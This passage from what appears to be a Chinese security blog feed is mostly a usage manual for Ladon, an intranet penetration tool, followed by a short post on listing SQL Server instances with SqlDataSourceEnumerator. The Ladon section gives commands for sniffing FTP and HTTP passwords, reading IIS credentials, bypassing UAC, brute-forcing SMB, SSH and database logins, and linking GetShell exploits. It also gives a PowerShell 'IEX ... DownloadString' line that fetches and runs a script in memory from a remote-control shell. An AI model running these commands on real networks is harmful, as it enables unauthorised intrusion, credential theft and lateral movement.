下载功能(2)</h4><p>下载功能主要用于内网文件传输或者将VPS文件下载至目标机器<br></p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>HttpDownLoad</td><td>HTTP下载</td><td>Ladon HttpDownLoad <a href="http://k8gege.org/test.exe">http://k8gege.org/test.exe</a></td></tr><tr><td>2</td><td>FtpDownLoad</td><td>Ftp下载</td><td>Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe</td></tr></tbody></table><h4 id="0x007-网络嗅探-3"><a href="#0x007-网络嗅探-3" class="headerlink" title="0x007 网络嗅探(3)"></a>0x007 网络嗅探(3)</h4><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br><br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br><br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具<br><br>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br><br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br><br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)<br></p><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>FtpSniffer/SnifferFtp</td><td>Ftp密码嗅探</td><td>Ladon FtpSniffer 192.168.1.5</td></tr><tr><td>2</td><td>HttpSniffer/SnifferHTTP</td><td>HTTP密码嗅探</td><td>Ladon HTTPSniffer 192.168.1.5</td></tr><tr><td>3</td><td>Sniffer</td><td>网络嗅探(源地址、目标地址)</td><td>Ladon Sniffer</td></tr></tbody></table><h4 id="0x008-密码读取-1"><a href="#0x008-密码读取-1" class="headerlink" title="0x008 密码读取(1)"></a>0x008 密码读取(1)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>EnumIIS/IisWeb</td><td>IIS站点密码读取</td><td>Ladon EnumIIS 或 Ladon IisWeb</td></tr></tbody></table><h4 id="0x009-信息收集-3"><a href="#0x009-信息收集-3" class="headerlink" title="0x009 信息收集(3)"></a>0x009 信息收集(3)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>EnumProcess/ProcessList/tasklist</td><td>进程详细信息</td><td>Ladon EnumProcess 或 Ladon Tasklist</td></tr><tr><td>2</td><td>GetCmdLine/CmdLine</td><td>获取命令行参数</td><td>Ladon cmdline 或 Ladon cmdline cmd.exe</td></tr><tr><td>3</td><td>GetInfo/GetInfo2</td><td>获取渗透基础信息</td><td>Ladon GetInfo 或 Ladon GetInfo2</td></tr></tbody></table><h4 id="0x010-其它功能-3"><a href="#0x010-其它功能-3" class="headerlink" title="0x010 其它功能(3)"></a>0x010 其它功能(3)</h4><table><thead><tr><th>ID</th><th>模块名称</th><th>功能说明</th><th>用法</th></tr></thead><tbody><tr><td>1</td><td>BypassUac</td><td>绕过UAC执行,支持Win7-Win10</td><td>Ladon BypassUac c:\1.exe 或 Ladon BypassUac c:\1.bat</td></tr><tr><td>2</td><td>EnableDotNet</td><td>一键启用.net 3.5(2008系统默认未启用)</td><td>Ladon EnableDotNet</td></tr><tr><td>3</td><td>gethtml</td><td>获取内网站点HTML源码</td><td>Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a></td></tr></tbody></table><p>注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档<br><br> 中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br><br> 高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。<br></p><h3 id="外部插件模块-10"><a href="#外部插件模块-10" class="headerlink" title="外部插件模块(10)"></a>外部插件模块(10)</h3><table><thead><tr><th>ID</th><th>功能</th><th>实现语言</th><th>功能说明</th></tr></thead><tbody><tr><td>1</td><td>漏洞扫描</td><td>C语言</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-0708-Windows-Rdp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" target="_blank" rel="noopener">CVE 2019-0708 Windows Rdp 3389漏洞批量检测</a></td></tr><tr><td>2</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-ThinkPHP-5.0.22-5.1.29-RCE-GetShell-Exploit" target="_blank" rel="noopener">ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit</a></td></tr><tr><td>3</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/ZimbraExploit" target="_blank" rel="noopener">CVE-2019-9621 Zimbra GetShell Exploit</a></td></tr><tr><td>4</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/CVE-2019-0604" target="_blank" rel="noopener">CVE-2019-0604 SharePoint GetShell Exploit</a></td></tr><tr><td>5</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-3088-ActiveMQ-GetShell-Exploit" target="_blank" rel="noopener">CVE 2016-3088 ActiveMQ GetShell Exploit</a></td></tr><tr><td>6</td><td>漏洞利用</td><td>Python</td><td><a href="https://github.com/k8gege/SolrExp" target="_blank" rel="noopener">Apache Solr 8.2.0 Velocity RCE 0day Exploit</a></td></tr><tr><td>7</td><td>漏洞利用</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8" target="_blank" rel="noopener">PhpStudy后门 GetShell Exploit</a></td></tr><tr><td>8</td><td>命令执行</td><td>INI配置</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FSSH%E4%B8%8A%E6%8E%A7" target="_blank" rel="noopener">INI调用外部程序命令批量Linux上控</a></td></tr><tr><td>9</td><td>命令执行</td><td>INI配置</td><td><a href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FWin%E4%B8%8A%E6%8E%A7" target="_blank" rel="noopener">INI调用外部程序命令批量Windowns上控</a></td></tr><tr><td>10</td><td>漏洞扫描</td><td>Python</td><td><a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">PHP-FPM 远程代码执行漏洞(CVE-2019-11043)</a></td></tr><tr><td>11</td><td>漏洞扫描</td><td>Exp生成器</td><td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">Weblogic CVE-2018-2894漏洞检测</a></td></tr><tr><td>12</td><td>漏洞利用</td><td>PowerShell</td><td><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">MS17010EXP 永恒之蓝漏洞利用</a></td></tr><tr><td>13</td><td>脚本调用</td><td>PowerShell</td><td><a href="http://k8gege.org/p/32e1a912.html">Kali 2019无PowerShell执行脚本</a></td></tr></tbody></table><p>文档参考Cscan: <a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></p><h2 id="中级用法"><a href="#中级用法" class="headerlink" title="中级用法"></a>中级用法</h2><h3 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h3><p>0x001 参数 ip/24 ip/16 ip/8<br><br>命令: Ladon 192.168.1.8/24 OnlinePC<br></p><p>0x002 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt<br><br>程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt<br><br>无需指定txt程序会自动加载文件进行扫描,如扫描存活主机只需命令: Ladon OnlinePC<br></p><h3 id="禁ping扫描"><a href="#禁ping扫描" class="headerlink" title="禁ping扫描"></a>禁ping扫描</h3><p>默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网<br><br>或者目标机器禁ping时,使用noping参数进行扫描,速度稍慢一点<br><br>Ladon noping<br><br>Ladon noping 192.168.1.8/24<br><br>Ladon noping 192.168.1.8/24 MS17010<br></p><h3 id="Socks5代理扫描"><a href="#Socks5代理扫描" class="headerlink" title="Socks5代理扫描"></a>Socks5代理扫描</h3><p>Windows下暂未发现比较好的支持.NET程序的代理工具，所以使用Kali版<br><br>proxychains mono Ladon noping 192.168.1.8/24 MS17010<br><br>proxychains mono Ladon noping <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a> WhatCMS<br></p><h3 id="配置INI调用任意程序、密码爆破"><a href="#配置INI调用任意程序、密码爆破" class="headerlink" title="配置INI调用任意程序、密码爆破"></a>配置INI调用任意程序、密码爆破</h3><p>适用场景，需调用相关命令或第三方工具进行批量操作<br><br>或者有新的POC，但来不及或无法写成DLL来调用时<br><br>很多第3方工具不支持批量或者说根本不支持批量网段<br><br>而Ladon不只限于批量IP、URL、IP段、任意内容等<br><br>是紧急情况下最适合用于验证内网是否存在漏洞工具<br><br>新的漏洞来时你能调好POC就不错了，批量更要时间<br></p><h4 id="调用系统ping命令进行存活主机探测"><a href="#调用系统ping命令进行存活主机探测" class="headerlink" title="调用系统ping命令进行存活主机探测"></a>调用系统ping命令进行存活主机探测</h4><p>ping.ini<br><br>[Ladon]<br><br>exe=cmd.exe<br><br>arg=/c ping $ip$<br></p><p>命令:  Ladon ping.ini<br><br>命令:  Ladon 192.168.1.8/24 ping.ini<br></p><h4 id="调用Python-poc批量检测漏洞"><a href="#调用Python-poc批量检测漏洞" class="headerlink" title="调用Python poc批量检测漏洞"></a>调用Python poc批量检测漏洞</h4><p>[Ladon]<br><br>exe=F:\Python279\python.exe<br><br>arg=CVE-2019-11043-POC.py $ip$<br></p><p>例子: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a></p><h4 id="自定义程序密码爆破"><a href="#自定义程序密码爆破" class="headerlink" title="自定义程序密码爆破"></a>自定义程序密码爆破</h4><p>例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破<br><br>根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。<br></p><p>smbhash.ini<br><br>[Ladon]<br><br>exe=smbexec.exe<br><br>arg=-hashes $pass$ $user$@$ip$<br><br>isok=Launching semi-interactive shell<br><br>port=445<br><br>log=true<br></p><p>INI参数说明<br><br>isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”<br><br>port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br><br>log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示<br></p><p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br></p><h3 id="配置端口扫描参数"><a href="#配置端口扫描参数" class="headerlink" title="配置端口扫描参数"></a>配置端口扫描参数</h3><p>使用PortScan模块时，默认扫描常见高危漏洞端口<br><br>遇到修改了默认端口的，Ladon就无法扫描了吗？<br><br>使用port.txt<br><br>格式1:80,21,1433,3306,445<br><br>格式2:80-88,21-23,5800-5900<br><br>格式3:<br><br>21<br><br>23<br><br>80<br><br>格式4:<br><br>80-88<br><br>21-23<br></p><h3 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h3><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br><br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br><br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认<br></p><h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><p>数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行<br></p><h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br><br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br><br>check.txt<br><br>192.168.1.8 1433 master sa k8gege<br><br>192.168.1.8 sa k8gege<br><br>192.168.1.8 1433 sa k8gege<br><br>命令: Ladon MssqlScan<br></p><h5 id="oracle同理"><a href="#oracle同理" class="headerlink" title="oracle同理"></a>oracle同理<br></h5><p>192.168.1.8 1521 orcl system k8gege<br><br>192.168.1.8 orcl system k8gege<br><br>192.168.1.8 system k8gege<br><br>命令: Ladon OracleScan<br></p><h5 id="mysql无需指定数据库名"><a href="#mysql无需指定数据库名" class="headerlink" title="mysql无需指定数据库名"></a>mysql无需指定数据库名<br></h5><p>192.168.1.8 3306 root k8gege<br><br>192.168.1.8 root k8gege<br><br>命令: Ladon MysqlScan<br></p><h5 id="系统密码"><a href="#系统密码" class="headerlink" title="系统密码"></a>系统密码</h5><p>SSH<br><br>check.txt<br><br>192.168.1.8 22 root k8gege<br><br>192.168.1.8 root k8gege<br><br>命令: Ladon SshScan<br><br>SMB/IPC/WMI(直接ip/用户/密码)<br><br>check.txt<br>192.168.1.8 root k8gege<br><br>命令: Ladon WmiScan<br></p><h5 id="网站密码"><a href="#网站密码" class="headerlink" title="网站密码"></a>网站密码</h5><p>weblogic<br><br>check.txt(url 用户 密码)<br><br><a href="http://192.168.1.8:7001/console" target="_blank" rel="noopener">http://192.168.1.8:7001/console</a> weblogic k8gege<br><br>命令: Ladon WeblogicScan<br></p><h5 id="文件密码"><a href="#文件密码" class="headerlink" title="文件密码"></a>文件密码</h5><p>因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码<br><br>命令: Ladon test.rar RarScan<br></p><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p>PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br><br>PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。<br></p><h4 id="0x001-PowerShell本地加载"><a href="#0x001-PowerShell本地加载" class="headerlink" title="0x001 PowerShell本地加载"></a>0x001 PowerShell本地加载<br></h4><p>适用于支持PowerShell交互远控或Shell，如Cobalt Strike</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p><h4 id="0x002-Cmd本地加载"><a href="#0x002-Cmd本地加载" class="headerlink" title="0x002 Cmd本地加载"></a>0x002 Cmd本地加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p><h4 id="0x003-Cmd远程加载"><a href="#0x003-Cmd远程加载" class="headerlink" title="0x003 Cmd远程加载"></a>0x003 Cmd远程加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure><p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p><h4 id="0x004-远控交互式CMD"><a href="#0x004-远控交互式CMD" class="headerlink" title="0x004 远控交互式CMD"></a>0x004 远控交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p><h4 id="0x005-菜刀非交互CMD"><a href="#0x005-菜刀非交互CMD" class="headerlink" title="0x005 菜刀非交互CMD"></a>0x005 菜刀非交互CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p><h4 id="0x006-Empire非交互CMD"><a href="#0x006-Empire非交互CMD" class="headerlink" title="0x006 Empire非交互CMD"></a>0x006 Empire非交互CMD</h4><p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p><h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><p>Ladon最初的设计就是一款扫描框架，为了方便才内置功能<br><br>毕竟需要使用一个功能就得在目标多上传一个文件是顶麻烦的<br><br>不像MSF框架和模块多大都无所谓，因为你只是在本地使用<br><br>为了让大家都可以自定义模块，Ladon插件支持多种编程语言<br><br>最菜可通过INI配置插件，了解HTTP可通过EXP生成器生成POC<br><br>懂得编程可使用C#、Delphi、VC编写DLL，PowerShell脚本<br></p><h4 id="0x001-Exp生成器"><a href="#0x001-Exp生成器" class="headerlink" title="0x001 Exp生成器"></a>0x001 Exp生成器</h4><p>EXP生成器教程: <a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a><br><br>实战例子: <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894</a></p><h4 id="0x002-自定义模块教程"><a href="#0x002-自定义模块教程" class="headerlink" title="0x002 自定义模块教程"></a>0x002 自定义模块教程</h4><p>自定义模块教程: <a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a><br></p><h4 id="0x003-插件例子源码"><a href="#0x003-插件例子源码" class="headerlink" title="0x003 插件例子源码"></a>0x003 插件例子源码</h4><p><a href="https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar</a></p><h3 id="注本页面的教程并不是很全，详情请看WIKI-我会慢慢完善"><a href="#注本页面的教程并不是很全，详情请看WIKI-我会慢慢完善" class="headerlink" title="注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善"></a>注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善</h3><h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a><a href="#readme">Top</a></h4>]]></content>
    
    <summary type="html">
    
       Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.7版本内置40个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。 
    
    </summary>
    
    
      <category term="工具" scheme="http://k8gege.org/categories/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/Cobalt-Strike/"/>
    
      <category term="内网" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
    
      <category term="Code" scheme="http://k8gege.org/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>利用SqlDataSourceEnumerator获取局域网SQL主机</title>
    <link href="http://k8gege.org/p/61471.html"/>
    <id>http://k8gege.org/p/61471.html</id>
    <published>2020-03-28T03:39:45.695Z</published>
    <updated>2020-01-18T11:51:43.871Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的。</p><h3 id="SqlDataSourceEnumerator"><a href="#SqlDataSourceEnumerator" class="headerlink" title="SqlDataSourceEnumerator"></a>SqlDataSourceEnumerator</h3><p>命名空间: System.Data.Sql<br>程序集: System.Data.dll</p><p>提供了一种枚举本地网络内的所有可用 SQL Server 实例的机制。</p><p>通过方法调用返回的表包含以下列，所有列均包含 string 值：<br>列     描述<br>ServerName     服务器的名称。<br>InstanceName     服务器实例的名称。 如果服务器作为默认实例运行，则为空白。<br>IsClustered     指示服务器是否属于群集。<br>Version     服务器的版本。 例如:</p><p>-9.00 （SQL Server 2005）<br>-10.0. xx （SQL Server 2008）<br>-10.50 （SQL Server 2008 R2）<br>-11.0. xx （SQL Server 2012）</p><h3 id="C-示例代码"><a href="#C-示例代码" class="headerlink" title="C#示例代码"></a>C#示例代码</h3><p>.NET与PowerShell谁的兼容性和执行效率更好就不用我说了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System.Data.Sql;  </span><br><span class="line">  </span><br><span class="line">class Program  </span><br><span class="line">&#123;  </span><br><span class="line">  static void Main()  </span><br><span class="line">  &#123;  </span><br><span class="line">    &#x2F;&#x2F; Retrieve the enumerator instance and then the data.  </span><br><span class="line">    SqlDataSourceEnumerator instance &#x3D;  </span><br><span class="line">      SqlDataSourceEnumerator.Instance;  </span><br><span class="line">    System.Data.DataTable table &#x3D; instance.GetDataSources();  </span><br><span class="line">  </span><br><span class="line">    &#x2F;&#x2F; Display the contents of the table.  </span><br><span class="line">    DisplayData(table);  </span><br><span class="line">  </span><br><span class="line">    Console.WriteLine(&quot;Press any key to continue.&quot;);  </span><br><span class="line">    Console.ReadKey();  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  private static void DisplayData(System.Data.DataTable table)  </span><br><span class="line">  &#123;  </span><br><span class="line">    foreach (System.Data.DataRow row in table.Rows)  </span><br><span class="line">    &#123;  </span><br><span class="line">      foreach (System.Data.DataColumn col in table.Columns)  </span><br><span class="line">      &#123;  </span><br><span class="line">        Console.WriteLine(&quot;&#123;0&#125; &#x3D; &#123;1&#125;&quot;, col.ColumnName, row[col]);  </span><br><span class="line">      &#125;  </span><br><span class="line">      Console.WriteLine(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PowerShell命令"><a href="#PowerShell命令" class="headerlink" title="PowerShell命令"></a>PowerShell命令</h3><p>系统未安装或禁用PowerShell会失效，但也比国人故意吹捧的PowerUPSQL好很多倍。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br><span class="line"></span><br><span class="line">ServerName          InstanceName        IsClustered         Version</span><br><span class="line">----------          ------------        -----------         -------</span><br><span class="line">K82003-77562E10</span><br><span class="line">WIN-OLDM1T2H9M4</span><br></pre></td></tr></table></figure><h3 id="PowerUPSQL"><a href="#PowerUPSQL" class="headerlink" title="PowerUPSQL"></a>PowerUPSQL</h3><p>此工具也是基于SqlDataSourceEnumerator实现的，兼容性较差，很多系统下运行各种报错。</p><pre><code class="Bash">PS C:\Users\k8gege\Desktop\PowerUpSQL-master&gt; Get-SQLInstanceBroadcast -Verbose详细信息: Attempting to identify SQL Server instances on the broadcast domain.详细信息: 2 SQL Server instances were found.ComputerName                        Instance                           IsClustered                        Version                           ------------                        --------                           -----------                        -------                           K82003-77562E10                     K82003-77562E10                                                                                         WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre><h3 id="Ladon-EnumMssql"><a href="#Ladon-EnumMssql" class="headerlink" title="Ladon EnumMssql"></a>Ladon EnumMssql</h3><p>Ladon的EnumMssql模块不支持扫描，若内网存在多个网段，可使用PortScan扫描探测。<br><img alt="img" data-original="https://camo.githubusercontent.com/2e97e127bfc1acd625ee289dbfaf4b3ffd307bd7/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f63732f43535f456e756d4d5353514c2e676966"></p><p>Ladon与PowerUPSQL对比，Ladon支持任意Win系统，而PowerUPSQL就未必能用了<br><img alt="img" data-original="https://camo.githubusercontent.com/73b58a071a70adf62dc7f4aecd1dff48d8e5df40/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f6578652f456e756d4d5353514c2e676966"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程
      
    
    </summary>
    
    
      <category term="内网" scheme="http://k8gege.org/categories/%E5%86%85%E7%BD%91/"/>
    
      <category term=".NET" scheme="http://k8gege.org/categories/NET/"/>
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="编程" scheme="http://k8gege.org/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="源码" scheme="http://k8gege.org/categories/%E6%BA%90%E7%A0%81/"/>
    
      <category term="SQL" scheme="http://k8gege.org/categories/SQL/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term=".NET" scheme="http://k8gege.org/tags/NET/"/>
    
      <category term="SQL" scheme="http://k8gege.org/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322</title>
    <link href="http://k8gege.org/p/19321.html"/>
    <id>http://k8gege.org/p/19321.html</id>
    <published>2020-03-28T03:39:45.695Z</published>
    <updated>2020-01-15T15:25:43.260Z</updated>
    
